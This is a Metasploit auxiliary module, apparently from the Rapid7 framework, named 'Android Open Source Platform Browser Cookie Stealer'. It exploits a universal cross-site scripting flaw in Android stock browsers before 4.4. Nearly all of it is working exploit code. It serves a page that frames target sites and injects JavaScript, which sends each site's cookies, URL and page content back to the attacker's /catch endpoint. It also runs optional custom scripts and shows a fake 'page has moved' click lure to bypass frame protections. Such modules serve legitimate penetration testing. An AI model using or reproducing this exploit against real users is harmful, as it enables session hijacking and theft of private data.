##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Android Open Source Platform Browser Cookie Stealer',
      'Description'    => %q{
        This module exploits a UXSS vulnerability present in all versions of
        Android's open source stock browser before Android 4.4.

        By default it is assumed that all of the TARGET_URLS can be loaded
        into iframes. To steal from a URL that uses the X-Frame-Options HTTP
        header to prevent framing, enable the BYPASS_XFO option to enable
        a one-click exploit of the first URL in TARGET_URLS.
      },
      'Author'         => [
        'Rafay Baloch',   # Original discovery, disclosure
        'joev'            # Metasploit module
      ],
      'License'        => MSF_LICENSE,
      'Actions'        => [
        [ 'WebServer' ]
      ],
      'PassiveActions' => [
        'WebServer'
      ],
      'References' => [
        [ 'EDB', '22581' ],
      ],
      'DefaultAction'  => 'WebServer'
    ))

    register_options([
      OptString.new('TARGET_URLS', [
        true,
        "The comma-separated list of URLs to steal.",
        'http://example.com'
      ]),
      OptString.new('CUSTOM_JS', [
        false,
        "A string of javascript to execute in the context of the target URLs.",
        ''
      ]),
      OptBool.new('BYPASS_XFO', [
        false,
        "Steal a single URL that uses X-Frame-Options.",
        false
      ])
    ], self.class)
  end

  def on_request_uri(cli, request)
    print_status("Request '#{request.method} #{request.uri}'")

    if request.uri =~ /catch/
      print_good JSON.parse(request.body).inspect
      return
    end

    payload_fn = Rex::Text.rand_text_alphanumeric(4+rand(8))
    domains = datastore['TARGET_URLS'].split(',')

    html = <<-EOS
<html>
  <body>
    <script>
      var targets = JSON.parse(atob("#{Rex::Text.encode_base64(JSON.generate(domains))}"));
      var bypassXFO = #{datastore['BYPASS_XFO']};
      var receivedSomething = false;

      window.onmessage = function(e) {
        if (bypassXFO && e.data) receivedSomething = true;
        var x = new XMLHttpRequest;
        x.open('POST', window.location+'/catch', true);
        x.send(e.data);
      };

      function randomString() {
        var str = '';
        for (var i = 0; i < 5+Math.random()*15; i++) {
          str += String.fromCharCode('A'.charCodeAt(0) + parseInt(Math.random()*26))
        }
        return str;
      }

      function installFrame(target) {
        var f = document.createElement('iframe');
        var n = randomString();
        f.setAttribute('name', n);
        f.setAttribute('src', target);
        f.onload = function(){
          attack(target, n);
        };
        document.body.appendChild(f);
      }

      function attack(target, n) {
        var exploit = function(){
          window.open('\\u0000javascript:(opener||top).postMessage(JSON.stringify({cookie:document'+
            '.cookie,url:location.href,body:document.body.innerHTML}),"*");'+
            '#{datastore['CUSTOM_JS']||''};void(0);', n);
        }
        if (!n) {
          n = randomString();
          var w = window.open(target, n);
          var clear = setInterval(function(){
            if (receivedSomething) clearInterval(clear);
            else exploit();
          }, 300);
        } else {
          exploit();
        }
      }

      function onclickHandler() {
        for (var i = 0; i < targets.length; i++) {
          attack(targets[i]);
          if (bypassXFO) return false;
        }
        return false;
      }

      window.onload = function(){
        if (bypassXFO) {
          document.querySelector('#click').style.display='block';
          window.onclick = onclickHandler;
        } else {
          for (var i = 0; i < targets.length; i++) {
            installFrame(targets[i]);
          }
        }
      }
    </script>
    <div style='text-align:center;margin:20px 0;font-size:22px;display:none' id='click'>
      The page has moved. <a href='#'>Click here to be redirected.</a>
    </div>
  </body>
</html>
    EOS

    print_status("Sending initial HTML ...")
    send_response_html(cli, html)
  end

  def backend_url
    proto = (datastore["SSL"] ? "https" : "http")
    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
    port_str = (datastore['SRVPORT'].to_i == 80) ? '' : ":#{datastore['SRVPORT']}"
    "#{proto}://#{myhost}#{port_str}/#{datastore['URIPATH']}/catch"
  end

  def run
    exploit
  end

end
